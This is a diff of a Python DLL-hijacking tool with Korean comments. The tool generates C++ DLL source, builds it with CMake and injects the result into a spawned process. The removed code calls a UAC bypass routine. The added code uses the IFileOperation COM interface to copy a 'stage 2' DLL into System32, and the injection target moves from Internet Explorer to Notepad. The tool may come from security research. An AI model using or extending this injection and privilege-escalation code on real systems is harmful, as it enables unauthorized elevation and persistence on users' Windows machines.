@@ -192,26 +192,25 @@ class hiJacking():
         psutil.Process(exe_pid).kill()
         # #2. IFileOperation 코드에 원하는 인자를 세팅 후 빌드 하기
         
-        dll_code = """bool __stdcall DllMain(HMODULE /*module*/, DWORD reason, LPVOID /*reserved*/) {
-    if (reason == DLL_PROCESS_ATTACH){
-        PCWSTR srcPath = L"%s";
-        PCWSTR desPath = L"%s";
-        PCWSTR FileName = L"%s";
-        HRESULT res2 = CopyItem(srcPath, desPath, FileName);
-        AllocConsole();
-        FILE* fp = freopen("CONOUT$", "w", stdout);
-        //cout << res << endl;
-        cout << res2 << endl;
-    }
-    if(reason == DLL_THREAD_ATTACH){
-        bool res =  UACBypassCopy();
-        AllocConsole();
-        freopen("CONOUT$", "w", stdout);
-        cout << res << endl;
-    }
-    return true;
-}"""
+        dll_code = """int haxproc()
+{
+	//IMPORTANT: This is an unicode dll
+	//Resolve %TEMP% path
+
+	//Calls the COM interface to copy the stage 2 dll to the Windows path //C:\\Windows\\System32
+	HRESULT test = CopyItem(L"{src_path}", L"{des_path}", L"{fileName}"); //Resolve the windows path it may not be in C:
+	if (SUCCEEDED(test))
+	{
+		MessageBox(0, L"Stage-2 Installed", 0, 0);
+	}
+
+
+	return 0;
+}""".format(src_path = "",des_path="",fileName="")
         
+        with open("CreateIFileOperationDLL/dll.cpp",'w') as dllFile:
+            dllFile.write(dll_code)
+            dllFile.close()
         
         # #3. 수정 완료한 dll.cpp를 Cmake를 이용하여 빌드(종속성 에러 때문에 Cmake 설치 요구 표시)
         if(os.system("cmake")):
@@ -288,12 +287,14 @@ if __name__=='__main__':
     # success = dll_hijact.search_order_hijack(20588)    
     # for i,j in success.items():
     #     print(i,j)
-    os.system("cd CreateIFileOperationDLL && .\Build.bat")
-    time.sleep(2)
-    explore_pid = dll_hijact.create_process("C:/Program Files/Internet Explorer/iexplore.exe")
-    inject(explore_pid,"CreateIFileOperationDLL\Debug\exploitDll.dll")    
-    os.remove("CreateIFileOperationDLL\CMakeCache.txt")
-    shutil.rmtree("CreateIFileOperationDLL\CMakeFiles")
+    # os.system("cd CreateIFileOperationDLL && .\Build.bat")
+    # time.sleep(2)
+    explore_pid = dll_hijact.create_process("C:/Windows/System32/notepad.exe")
+    
+    inject(explore_pid,"CreateIFileOperationDLL/Debug/exploitDll.dll") 
+    psutil.Process(explore_pid).kill()   
+    # os.remove("CreateIFileOperationDLL\CMakeCache.txt")
+    # shutil.rmtree("CreateIFileOperationDLL\CMakeFiles")
 # 종속성 에러 방지를 위해 setup.py 작성 필요
 
 
